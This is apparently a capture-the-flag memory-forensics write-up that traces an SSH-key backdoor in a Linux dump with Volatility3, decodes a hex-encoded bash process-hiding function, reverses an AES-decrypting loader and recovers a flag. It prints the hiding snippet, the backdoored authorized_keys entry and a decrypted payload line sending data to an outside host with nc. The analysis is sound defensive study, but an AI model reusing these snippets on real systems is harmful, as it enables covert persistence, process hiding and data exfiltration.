I have a memory dump and a Volatility3 profile. I place the profile into:

```
volatility3/volatility3/symbols/linux/
```

Then I analyze it. But since Volatility 3 lacks many plugins, I fall back to analyzing with `strings` and dumping with Volatility.
Because I know I should focus on **SSH activity**, I find this:

```
command="eval \"\$(echo 686964652829207b0a202020205b5b202d4c202f6574632f6d746162205d5d202626207b206370202f6574632f6d746162202f6574632f6d7461622e62616b3b206d76202f6574632f6d7461622e62616b202f6574632f6d7461623b207d0a202020205f7069643d247b313a2d24247d0a202020205b5b20245f706964203d7e205e5b302d395d2b24205d5d202626207b206d6f756e74202d6e202d2d62696e64202f6465762f73686d202f70726f632f245f706964202626206563686f20225b5448435d2050494420245f706964206973206e6f772068696464656e223b2072657475726e3b207d0a202020206c6f63616c205f6172677374720a20202020666f72205f7820696e2022247b403a327d223b20646f205f6172677374722b3d222027247b5f782f2f5c272f5c275c225c275c225c277d27223b20646f6e650a202020205b5b20242862617368202d6320227073202d6f20737461743d202d70205c245c242229203d7e205c2b205d5d207c7c20657865632062617368202d6320226d6f756e74202d6e202d2d62696e64202f6465762f73686d202f70726f632f5c245c243b2065786563205c2224315c2220245f617267737472220a2020202062617368202d6320226d6f756e74202d6e202d2d62696e64202f6465762f73686d202f70726f632f5c245c243b2065786563205c2224315c2220245f617267737472220a7d0a0a68696465202f7573722f7362696e2f6461656d6f6e20260a | xxd -r -p) & ssh user@192.168.1.38\"" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCtHVO97vah6BOUgl6pYgi+X+Iru7Vocs5zupRxxncdvg8xhuDn3SWbFMIu4HjBQNt6x7LyvB7MvJ8laxgottrcgHJbuQ8+pwW9CJI2Z8f/UOj3+AlUrjkz8LiCN+4p030HvSIMonFSP32kk5pYb9Y7toLK6k4hfbkwh6e1zIRlUyFcr3hQ5C3Kor5vHxPpnG6MfxpvxbbzBZ++uqOY0Z7JQ6n24FJQuqVYAALENsjHPQWhBV76ktRyq8i/cv0ijQ5pQ2QcE3NK/zYd70LbUm+VbtS+WQ5xurd/tx9QvwpH9MBjmMmF5nmdyCKKsG9KcW7LrLxKlidh1PURSxrgMR1Jcsyq3iFvCW+oD9RNWGOiu6ROnEOwMOi/EAxpo12KydIyBLkEPDWPEhu292Es9Lf01H/jjTtPNJcYFfj5thrap+jGRedIxwFyEXpjDz1KrSMZX7UCoiUYJXA78bzs+QNP7+ADWdXkc9YJBTnGT+IYScy6h6Wba8FhMRqhSxXPYjuxakPgfYSx4qitA5+Na64c3bZk5qmKwsa16e79bZcImSDLXyWaSGsvLP9YkpCIABZZuBDJdvjbXBrx7oSj2mt4FXGLNCt2y3flOOFBGD2nwg9Crs8xaXvb2XNv5P9mDB4XnKl3JspwdZBy23Ve/PoyPh9/NJlE9PjIKL9P3Terjw== user@midnight
```

I decode the hex string:

```bash
hide() {
    [[ -L /etc/mtab ]] && { cp /etc/mtab /etc/mtab.bak; mv /etc/mtab.bak /etc/mtab; }
    _pid=${1:-$$}
    [[ $_pid =~ ^[0-9]+$ ]] && { mount -n --bind /dev/shm /proc/$_pid && echo "[THC] PID $_pid is now hidden"; return; }
    local _argstr
    for _x in "${@:2}"; do _argstr+=" '${_x//\'/\'\"\'\"\'}'"; done
    [[ $(bash -c "ps -o stat= -p \$\$") =~ \+ ]] || exec bash -c "mount -n --bind /dev/shm /proc/\$\$; exec \"$1\" $_argstr"
    bash -c "mount -n --bind /dev/shm /proc/\$\$; exec \"$1\" $_argstr"
}

hide /usr/sbin/daemon &
```

So `/usr/sbin/daemon` is hiding something. I dump it:

```bash
python3 vol.py -f challenge.lime linux.pagecache.InodePages --find /usr/sbin/daemon --dump daemon_bin
```

Reversing the binary

```
000013e7  uint64_t pTq7L(int64_t arg1, int32_t arg2, int64_t arg3, int64_t arg4, int64_t arg5)

00001407      void* fsbase
00001407      int64_t rax = *(fsbase + 0x28)
00001416      int64_t rax_2 = EVP_CIPHER_CTX_new()
00001424      uint64_t result
00001424      
00001424      if (rax_2 != 0)
0000145a          int32_t var_20
0000145a          
0000145a          if (EVP_DecryptInit_ex(rax_2, EVP_aes_256_cbc(), 0, arg3, arg4) == 1)
00001496              if (EVP_DecryptUpdate(rax_2, arg5, &var_20, arg1, zx.q(arg2)) == 1)
000014ab                  int32_t rax_11 = var_20
000014ab                  
000014d5                  if (EVP_DecryptFinal_ex(rax_2, sx.q(var_20) + arg5, &var_20) == 1)
000014ed                      int32_t result_1 = rax_11 + var_20
000014f7                      EVP_CIPHER_CTX_free(rax_2)
000014fc                      result = zx.q(result_1)
000014d5                  else
000014de                      EVP_CIPHER_CTX_free(rax_2)
000014e3                      result = 0xffffffff
00001496              else
0000149f                  EVP_CIPHER_CTX_free(rax_2)
000014a4                  result = 0xffffffff
0000145a          else
00001463              EVP_CIPHER_CTX_free(rax_2)
00001468              result = 0xffffffff
00001424      else
00001426          result = 0xffffffff
00001426      
00001503      *(fsbase + 0x28)
00001503      
0000150c      if (rax == *(fsbase + 0x28))
00001514          return result
00001514      
0000150e      __stack_chk_fail()
0000150e      noreturn


00001515  int32_t main(int32_t argc, char** argv, char** envp)

00001525      void* fsbase
00001525      int64_t rax = *(fsbase + 0x28)
0000154d      int32_t fd = open(file: "/tmp/.dat", oflag: 0x42, 0x180)
0000154d      
0000155f      if (fd s>= 0 && ftruncate(fd) == 0)
000015b3          zXb4W = mmap(addr: nullptr, len: 0x98, prot: 3, flags: 1, fd, offset: 0)
000015b3          
000015c5          if (zXb4W != -1)
000015d1              uint64_t zXb4W_1 = zXb4W
000015df              int64_t rbx_1 = data_4028.q
000015e6              *zXb4W_1 = original_data
000015e9              *(zXb4W_1 + 8) = rbx_1
000015f4              int64_t rbx_2 = data_4038
000015fb              *(zXb4W_1 + 0x10) = data_4030
000015ff              *(zXb4W_1 + 0x18) = rbx_2
0000160a              int64_t rbx_3 = data_4048
00001611              *(zXb4W_1 + 0x20) = data_4040
00001615              *(zXb4W_1 + 0x28) = rbx_3
00001620              int64_t rbx_4 = data_4058
00001627              *(zXb4W_1 + 0x30) = data_4050.q
0000162b              *(zXb4W_1 + 0x38) = rbx_4
00001636              int64_t rbx_5 = data_4068
0000163d              *(zXb4W_1 + 0x40) = data_4060
00001641              *(zXb4W_1 + 0x48) = rbx_5
0000164c              int64_t rbx_6 = data_4078
00001653              *(zXb4W_1 + 0x50) = data_4070
00001657              *(zXb4W_1 + 0x58) = rbx_6
00001662              int64_t rbx_7 = data_4088
00001669              *(zXb4W_1 + 0x60) = data_4080.q
0000166d              *(zXb4W_1 + 0x68) = rbx_7
00001678              int64_t rbx_8 = data_4098
0000167f              *(zXb4W_1 + 0x70) = data_4090.q
00001683              *(zXb4W_1 + 0x78) = rbx_8
0000168e              int64_t rbx_9 = data_40a8
00001695              *(zXb4W_1 + 0x80) = data_40a0
0000169c              *(zXb4W_1 + 0x88) = rbx_9
000016aa              *(zXb4W_1 + 0x90) = data_40b0
000016bb              char* rax_10 = getenv(name: "AES_KEY")
000016d1              char* rax_11 = getenv(name: "AES_IV")
000016ef              void var_458
000016ef              void var_448
000016ef              
000016ef              if (rax_10 != 0 && rax_11 != 0 && vNh3Z(rax_10, &var_448, 0x20) == 0x20 && vNh3Z(rax_11, &var_458, 0x10) == 0x10)
00001750                  time_t rax_18 = time(nullptr)
00001760                  int128_t var_498
00001760                  __builtin_memset(s: &var_498, c: 0, n: 0x38)
0000177d                  int128_t var_488
0000177d                  var_488:4.d = 0x44c
00001787                  var_488.d = 0
00001791                  var_498:0xc.d = 1
00001791                  
000017bf                  if (rax_18 s< mktime(tp: &var_498))
000017bf                      goto label_1877
000017bf                  
0000180f                  for (int64_t i = 0; i u<= 0x97; i += 1)
000017fa                      *(i + zXb4W) ^= 0xaa
000017fa                  
00001838                  void line
00001838                  int32_t rax_26 = pTq7L(zXb4W, 0x98, &var_448, &var_458, &line)
00001838                  
0000184a                  if (rax_26 s>= 0)
0000185b                      *(&line + sx.q(rax_26)) = 0
0000186d                      system(&line)
00001877                      label_1877:
00001877                      
00001877                      while (true)
00001877                          sleep(seconds: 1)
00001877      
00001882      *(fsbase + 0x28)
00001882      
0000188b      if (rax == *(fsbase + 0x28))
00001897          return 1
00001897      
0000188d      __stack_chk_fail()
0000188d      noreturn
```

I find the following behavior:

* It expects a file `/tmp/.dat`.
* It uses **AES-256-CBC** decryption (`EVP_DecryptInit_ex`, `EVP_DecryptUpdate`, `EVP_DecryptFinal_ex`).
* The AES key and IV are fetched from **environment variables** (`AES_KEY`, `AES_IV`).
* After decryption, it executes the result with `system()`.

So I need to decrypt `/tmp/.dat`.

I dump the **environment variables**:

```bash
python vol.py -f challenge.lime linux.envars.Envars
...
AES_KEY 7557a272bacc4186952a567db00ae817704d059ecfdc8e630c04d8aabecd1e04
AES_IV  068131ad1d5c0c1516fce836d510ccce
```

Then I dump the `.dat` file:

```bash
python3 vol.py -f challenge.lime linux.pagecache.InodePages --find /tmp/.dat --dump data
```

Finally, I implement a Python script to decrypt it (according to the binaryâ€™s logic).

```python
from Crypto.Cipher import AES

# Extracted env key+iv
aes_key_hex = "7557a272bacc4186952a567db00ae817704d059ecfdc8e630c04d8aabecd1e04"
aes_iv_hex = "068131ad1d5c0c1516fce836d510ccce"
filename = "data" #=> .dat

# hex -> bytes
key = bytes.fromhex(aes_key_hex)
iv = bytes.fromhex(aes_iv_hex)

# read raw data
with open(filename, "rb") as f:
    data = bytearray(f.read())

# XOR with 0xAA
for i in range(len(data)):
    data[i] ^= 0xAA

# we only keep the 144 first bytes
data = data[:144]

# AES-256-CBC
cipher = AES.new(key, AES.MODE_CBC, iv)
decrypted = cipher.decrypt(bytes(data))

# Try to print text and raw output
try:
    print("ðŸŸ¢ Contenu dÃ©chiffrÃ© (texte) :\n")
    print(decrypted.decode("utf-8"))
except UnicodeDecodeError:
    print("ðŸŸ¡ Contenu binaire :\n")
    print(decrypted)
```

Running it gives me:

```
ðŸŸ¢ Decrypted content (text):

ðŸŸ¡ Binary content:

b"H\xb8/bin/sh\x00\x99PT_Rfh-cT^R\xe8N\x00\x00\x00echo 'MCTF{1n0d3_4nd_v0l4t1lity_4re_r3alLY_P0w3rfu11}' | nc 192.168.1.72 4444\x00..."
```

`MCTF{1n0d3_4nd_v0l4t1lity_4re_r3alLY_P0w3rfu11}`